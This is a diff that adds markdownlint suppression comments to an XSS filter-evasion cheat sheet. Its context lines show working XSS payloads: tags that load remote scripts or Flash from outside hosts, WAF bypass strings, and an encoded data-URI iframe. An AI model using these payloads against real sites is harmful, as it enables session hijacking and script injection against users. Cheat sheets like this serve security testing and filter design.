@@ -553,7 +553,9 @@ If they allow objects, you can also inject virus payloads to infect the users, e
 
 ### EMBED a Flash Movie That Contains XSS
 
+<!-- markdownlint-disable MD034-->
 Click here for a demo: ~~http://ha.ckers.org/xss.swf~~
+<!-- markdownlint-enable MD034-->
 
 `<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>`
 
@@ -671,7 +673,9 @@ Yet another XSS to evade the same filter, `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.
 
 And one last XSS attack to evade, `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i` using grave accents (again, doesn't work in Firefox):
 
+<!-- markdownlint-disable MD038-->
 `<SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>`
+<!-- markdownlint-enable MD038-->
 
 Here's an XSS example that bets on the fact that the regex won't catch a matching pair of quotes but will rather find any quotes to terminate a parameter string improperly:
 
@@ -939,6 +943,7 @@ header('Refresh: 0; URL='.$_GET['param']);
 
 ### WAF ByPass Strings for XSS
 
+<!-- markdownlint-enable MD038-->
 - `<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">`
 - `<Video> <source onerror = "javascript: alert (XSS)">`
 - `<Input value = "XSS" type = text>`
@@ -967,6 +972,7 @@ header('Refresh: 0; URL='.$_GET['param']);
 - `<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"`
 - `<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>`
 - `<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT> `
+<!-- markdownlint-disable MD038-->
 
 ### Filter Bypass Alert Obfuscation
 
